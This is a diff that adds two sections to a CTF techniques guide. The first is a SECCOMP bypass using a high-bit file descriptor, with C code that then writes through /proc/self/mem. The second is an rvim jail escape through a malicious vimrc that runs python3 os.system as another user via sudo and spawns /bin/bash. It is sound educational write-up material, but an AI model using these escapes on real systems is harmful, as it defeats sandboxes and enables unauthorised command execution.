@@ -17,6 +17,8 @@
   - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
   - [Container Information Leakage](#container-information-leakage)
 - [Levenshtein Distance Oracle Attack (SunshineCTF 2016)](#levenshtein-distance-oracle-attack-sunshinectf-2016)
+- [SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)](#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)
+- [rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)](#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)
 - [References](#references)
 
 ---
@@ -524,6 +526,46 @@ for c in string.printable:
 ```
 
 **Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.
+
+---
+
+## SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)
+
+**Pattern (tea):** SECCOMP filter blocks `close(fd)` for fd values 0, 1, and 2 (stdin/stdout/stderr). Bypass: `close(0x8000000000000002)` passes the 64-bit comparison (not equal to 2) but the kernel truncates the fd argument to 32 bits, actually closing fd 2. This frees fd 2, so the next `open()` returns fd 2. Now `write(2, ...)` writes to the newly opened file instead of stderr, and SECCOMP allows it because fd 2 was never explicitly blocked for write.
+
+```c
+// SECCOMP rule: deny close(fd) where fd == 0 || fd == 1 || fd == 2
+// Bypass: close with high-bit set
+close(0x8000000000000002);  // SECCOMP sees fd != 2 (64-bit compare) -> ALLOW
+// Kernel: fd = (int)(0x8000000000000002) = 2 -> closes fd 2
+
+open("/proc/self/mem", O_WRONLY);  // returns fd 2 (lowest available)
+// Now write to /proc/self/mem via fd 2 to modify parent process memory
+```
+
+**Key insight:** SECCOMP BPF operates on the raw 64-bit syscall argument, but the kernel's `close()` implementation casts to `int` (32-bit). Setting bit 63 changes the 64-bit value while preserving the 32-bit truncated result. This type/width mismatch between SECCOMP filter and kernel syscall handler is a general bypass pattern — check argument widths for any filtered syscall.
+
+---
+
+## rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)
+
+**Pattern (vimjail):** `rvim` (restricted vim) blocks `:!`, `:shell`, and similar command execution. However, `rvim -u custom_vimrc` loads a user-specified vimrc file that executes before restrictions are fully applied. If `rvim` is run via `sudo -u targetuser`, the vimrc can contain `:python3 import os; os.system("cmd")` to execute commands as the target user.
+
+```bash
+# Create malicious vimrc
+cat > /tmp/evil_vimrc << 'EOF'
+:python3 import os; os.system("/home/ctfuser/flagReader /.flag")
+:q!
+EOF
+
+# Launch rvim with custom vimrc as target user
+sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null
+
+# Alternative: interactive escape once inside rvim
+:py3 import os; os.system("/bin/bash")
+```
+
+**Key insight:** `rvim` restricts shell commands (`:!cmd`) but Python/Lua/Ruby interfaces remain available. The `:python3` or `:py3` command executes arbitrary Python code, including `os.system()`. If vim was compiled with `+python3`, this bypasses all shell restrictions. Check `:version` for `+python3`, `+lua`, or `+ruby` — any scripting interface escapes the jail.
 
 ---
 
